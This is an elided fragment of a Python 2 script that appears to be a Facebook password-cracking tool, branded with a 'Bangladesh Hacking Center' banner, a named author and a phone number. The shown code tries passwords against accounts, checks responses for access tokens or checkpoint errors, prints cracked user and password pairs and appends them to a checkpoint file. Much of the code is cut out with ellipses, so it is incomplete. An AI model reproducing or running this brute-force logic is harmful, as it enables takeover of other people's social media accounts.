...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 SHAMIM Hossen 💗
\x1b[1;91m➣ PGE NAME :  💣Bangladesh Hacking Center💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801884250097 👬
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m💖━━━━━━━━━❣️(MAFIA-KILLER-SHAMIM)❣️━━━━━━━━💖\n" 
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://www.facebook.com/white.hat.naca.hogar.shamim')
		login()
	elif ahmad =='0':
		exb()
	else:
	...
	time.sleep(0.5)
	print "\033[1;96m💖━━━━━━━━━━💘💘💘(MAFIA-KILLER-SHAMIM)💘💘💘━━━━━━━━━💖\n" 
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[SHAMIM-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[SHAMIM-Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
